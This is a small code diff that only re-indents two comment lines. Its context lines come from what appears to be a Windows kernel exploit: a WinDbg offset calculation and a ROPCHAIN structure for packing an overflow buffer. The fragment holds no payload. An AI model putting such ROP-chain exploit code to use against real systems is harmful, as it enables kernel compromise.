@@ -117,7 +117,7 @@ kd> ? fffff803`e223aa33 - fffff803`e1e06000
 Evaluate expression: 4409907 = 00000000`00434a33 <<-- offset..
 */
 
-  // To better align the buffer,
+  	// To better align the buffer,
 	// it is usefull to declare a
 	// memory structure, other-wise you will get holes
 	// in the buffer and end up with an access violation.
@@ -130,7 +130,7 @@ Evaluate expression: 4409907 = 00000000`00434a33 <<-- offset..
 	} ROPCHAIN, *PROPCHAIN;
 
 
-  // Pack The buffer as:  
+  	// Pack The buffer as:  
 
 	ROPCHAIN Chain;
 
